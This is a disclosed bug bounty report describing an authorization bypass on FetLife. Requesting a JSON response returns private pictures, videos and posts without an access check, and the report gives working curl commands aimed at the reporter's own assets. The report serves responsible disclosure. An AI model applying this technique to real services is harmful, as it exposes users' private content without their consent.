# Able to access private picture/video/writing when requesting for their JSON response

## Report Details
- **Report ID**: 1424291
- **URL**: https://hackerone.com/reports/1424291
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-12-12T06:43:03.279Z
- **Disclosed**: 2021-12-16T15:05:17.101Z

## Reporter
- **Username**: trieulieuf9
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: fetlife

## Vulnerability Information
# Description
Endpoint `https://fetlife.com/users/{user-id}/pictures/{pic-id}` has 2 types of responses, HTML and JSON. The type of response depends on `Accept`  header of request it get. If request contains `Accept: application/json`, then it will return JSON response. Other than that, it returns HTML response.

When this endpoint returns JSON response, it does not check if requester is authorized to access requested resource. Therefore, attacker can access any private picture by requesting them in JSON response.

# PoC
User `trieulieuf9` has the following private assets
**Picture**: https://fetlife.com/users/14104003/pictures/120041856
**Video**: https://fetlife.com/users/14104003/videos/3102890
**Post**: https://fetlife.com/users/14104003/posts/7673012

We can access them with the following `curl` commands
**Picture**: 
```
curl https://fetlife.com/users/14104003/pictures/120041856 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```
**Video**:
```
curl https://fetlife.com/users/14104003/videos/3102890 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```
**Post**:
```
curl https://fetlife.com/users/14104003/posts/7673012 -H "Cookie: _fl_sessionid={your-session}" -H "Accept: application/json" --user-agent "not cur1"
```

# Limitation
Attacker needs to know asset IDs before the attack.

## Impact

Attacker can access any private picture/video/post if he can somehow get their ID.

## Attachments
No attachments
